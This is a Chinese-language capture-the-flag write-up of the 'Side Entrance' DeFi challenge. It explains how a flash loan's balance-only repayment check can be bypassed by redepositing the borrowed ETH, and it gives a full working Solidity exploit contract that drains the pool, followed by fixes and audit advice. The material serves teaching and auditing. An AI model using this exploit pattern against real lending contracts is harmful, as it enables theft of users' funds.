# Side Entrance
## 一、题目信息

Side Entrance 核心考**闪电贷业务逻辑绕过漏洞**，场景为 ETH 资金池存提款与免费闪电贷业务。该资金池支持任意用户自由存入、提取 ETH，同时依托用户存款资金提供无门槛闪电贷服务，题目初始状态下资金池持有 1000 ETH，玩家仅持有 1 ETH，无额外权限与资金优势，通关要求为完整掏空资金池所有 ETH，并将全部资产转入指定的 recovery 回收账户。

## 二、读题 & 思考流程

### 1\. 第一直觉

题目描述：资金池支持用户存入、取出 ETH，同时提供免费闪电贷，使用用户存入的资金对外提供借贷服务。池子初始存有 1000 ETH，玩家仅有 1 ETH，需要掏空全部池子资金。

初步判断：无权限校验漏洞、无重入漏洞，大概率是**闪电贷业务逻辑校验不严谨**，属于典型的 DeFi 记账逻辑漏洞。

### 2\. 逐函数审计思考过程

1. **deposit 存款函数**：接收 ETH，累加用户地址对应的余额映射，无任何校验，只要转入 ETH 就会给用户记账。

2. **withdraw 取款函数**：读取用户记账余额，清空记账并转账对应 ETH，仅校验用户自有存款，无全局资金校验。

3. **flashLoan 闪电贷函数（高危核心）**：先给调用者转账对应数额 ETH，回调调用者的 `execute\(\)` 函数，最后仅校验**合约全局余额是否未减少**。

### 3\. 漏洞推理（关键思路）

- 闪电贷的校验逻辑只看**合约总余额**，不区分资金归属、资金来源

- 闪电贷借出的 ETH，可以由用户再次调用 deposit 存回池子

- 存回后，池子总余额不变，闪电贷校验通过，不会报错

- 最关键：这次存回的 ETH，会**记账为攻击者的个人存款**

- 闪电贷结束后，攻击者直接调用 withdraw，即可提走所有记账存款，掏空池子

### 4\. 做题思考（难点）

最初尝试仅在测试函数内编写代码，发现持续报错。随后推理底层机制：闪电贷会强制调用调用者的 `execute()` 回调函数，**外部EOA账户、Foundry测试合约无法实现合约回调函数**。因此得出结论：**本题必须编写自定义攻击合约，无纯测试函数解法**。

## 三、漏洞核心原理

### 1\. 核心源码漏洞片段

```solidity
function flashLoan(uint256 amount) external {
    uint256 balanceBefore = address(this).balance;

    IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

    if (address(this).balance < balanceBefore) {
        revert RepayFailed();
    }
}
```

### 2\. 完整攻击链路

1. 攻击者通过攻击合约调用 `flashLoan(1000 ether)`，借出池子全部资金

2. 池子向攻击合约转账 1000 ETH，触发 `execute()` 回调

3. 回调函数内调用 `deposit()`，将借来的 1000 ETH 重新存回资金池

4. 资金池全局余额不变，闪电贷还款校验通过，借贷流程结束

5. 此时 1000 ETH 已被记账为攻击者的个人存款

6. 攻击者调用 `withdraw()` 提取全部存款，掏空资金池

7. 将提取的全部 ETH 转账至 recovery 账户，完成通关

## 四、EXP
```solidity
// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";

contract SideEntranceChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant ETHER_IN_POOL = 1000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 1e18;

    SideEntranceLenderPool pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    function setUp() public {
        startHoax(deployer);
        pool = new SideEntranceLenderPool();
        pool.deposit{value: ETHER_IN_POOL}(); // 部署者向池子存入1000 ETH
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE); // 给玩家初始化1 ETH余额
        vm.stopPrank();
    }

    function test_assertInitialState() public view {
        assertEq(address(pool).balance, ETHER_IN_POOL);
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
    }

    // 核心攻击测试函数
    function test_sideEntrance() public checkSolvedByPlayer {
        Attacker attacker = new Attacker();
        attacker.attack(pool, recovery);
    }

    function _isSolved() private view {
        assertEq(address(pool).balance, 0, "Pool still has ETH");
        assertEq(recovery.balance, ETHER_IN_POOL, "Not enough ETH in recovery account");
    }
}

// 必须自定义攻击合约：仅合约可实现闪电贷execute回调
contract Attacker {
    // 主攻击函数：完成借贷、提款、转账全流程
    function attack(SideEntranceLenderPool pool, address recovery) external {
        pool.flashLoan(1000 ether); // 借空池子全部ETH
        pool.withdraw(); // 提取回调中记账为攻击者的1000 ETH
        payable(recovery).transfer(address(this).balance); // 资产转入回收账户，完成通关
    }

    // 闪电贷强制回调函数：漏洞核心利用点
    function execute() external payable {
        // 将闪电贷借来的ETH重新存回池子，篡改记账数据，满足余额校验
        SideEntranceLenderPool(msg.sender).deposit{value: msg.value}();
    }

    // 接收闪电贷ETH必备回调
    receive() external payable {}
}
```

## 五、脆弱的核心细节

### 1\. 资金校验维度单一（致命漏洞）

闪电贷仅校验**合约全局余额**，未校验**用户个人记账余额、资金归属**，导致可以挪用借贷资金伪装成用户存款。

### 2\. 借贷资金用途无任何限制

开发者未限制闪电贷借出资金的操作权限，用户可自由将借贷资金再次存入池子，篡改记账数据，打破资金池资产平衡逻辑。

### 3\. 取款无全局资产风控

withdraw 函数仅校验用户个人账户余额，不校验合约当前总资金，导致用户可提取远超个人自有、属于池子公共储备的资金。

## 六、开发者默认的错误逻辑

1. **默认闪电贷借出的资金只会用于外部交易**，不会回流存入自身资金池

2. **默认全局余额不变等价于资金无损失**，忽略了「记账数据篡改导致的资产所有权转移」

3. **默认用户存款必须是自有初始资金**，未考虑借贷资金伪装自有存款的场景

## 七、开发者遗漏的关键校验代码

本题最核心的缺失校验：**闪电贷还款校验，必须区分用户自有资金和借贷资金，禁止借贷资金回流记账**。

缺失逻辑：闪电贷回调阶段，禁止用户调用 deposit 存款函数；或校验用户存款资金来源，拒绝借贷回流资金记账。

补充标准安全校验示例：

```solidity
// 闪电贷执行期间锁定存款功能
bool public isFlashLoaning;

function flashLoan(uint256 amount) external {
    uint256 balanceBefore = address(this).balance;
    isFlashLoaning = true;
    IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();
    isFlashLoaning = false;
    if (address(this).balance < balanceBefore) revert RepayFailed();
}

function deposit() external payable {
    require(!isFlashLoaning, "Deposit forbidden during flashloan");
    balances[msg.sender] += msg.value;
}
```

## 八、同类项目审计重点

以后审计所有**资金池、闪电贷、存提款类 DeFi 项目**，优先盯以下 4 个关键点：

1. **校验维度**：区分「合约全局余额校验」和「用户个人记账校验」，二者不能等价替代

2. **函数互斥**：闪电贷、清算等特殊操作期间，锁定存款、取款、授权等敏感函数

3. **资金溯源**：存款、记账逻辑需校验资金来源，禁止临时借贷资金伪造自有资产

4. **边界风控**：取款不仅校验用户余额，需额外校验合约全局资产储备，防止掏空池子

## 九、漏洞修复方案

1. 增加闪电贷操作锁：闪电贷执行过程中，禁用 deposit 存款功能

2. 优化闪电贷校验逻辑：新增用户记账余额校验，不仅依赖全局余额

3. 隔离借贷资金与用户自有存款，借贷资金不参与个人账户记账

4. 取款函数增加全局资产校验，防止池子资金被全部掏空
